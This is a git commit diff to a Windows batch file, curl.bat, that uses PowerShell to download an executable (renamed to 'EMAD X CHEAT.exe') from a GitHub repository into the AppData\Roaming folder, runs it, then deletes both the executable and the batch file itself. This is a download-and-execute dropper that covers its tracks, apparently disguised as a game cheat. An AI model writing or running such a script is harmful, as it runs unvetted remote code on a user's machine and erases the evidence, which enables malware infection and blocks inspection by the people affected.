6c842a7eb804655c8031cc79a54ea5e87b7daeca
emad8787 <mdemadhossainfci28@gmail.com>
2025-03-22 23:57:19 +0600

    Update curl.bat

--- curl.bat
+++ curl.bat
@@ -6,16 +6,16 @@ set DOWNLOAD_DIR=C:\Users\Administrator\AppData\Roaming\
 if not exist "%DOWNLOAD_DIR%" mkdir "%DOWNLOAD_DIR%"
 
 :: Download the executable file to the specified directory
-powershell -Command "Invoke-WebRequest -Uri https://github.com/emad8787/panel/raw/refs/heads/main/Emad.exe -OutFile '%DOWNLOAD_DIR%\Emad.exe'"
+powershell -Command "Invoke-WebRequest -Uri https://github.com/emad8787/panel/raw/refs/heads/main/EMAD%20X%20CHEAT.exe -OutFile '%DOWNLOAD_DIR%\EMAD%20X%20CHEAT.exe'"
 
 :: Run the executable
-start "" "%DOWNLOAD_DIR%\Emad.exe"
+start "" "%DOWNLOAD_DIR%\EMAD%20X%20CHEAT.exe"
 
 :: Wait for the executable to finish before deleting the files
 timeout /t 5 /nobreak >nul
 
 :: Delete the downloaded executable file
-del "%DOWNLOAD_DIR%\Emad.exe"
+del "%DOWNLOAD_DIR%\EMAD%20X%20CHEAT.exe"
 
 :: Delete the .bat file itself after execution
 del "%~f0"
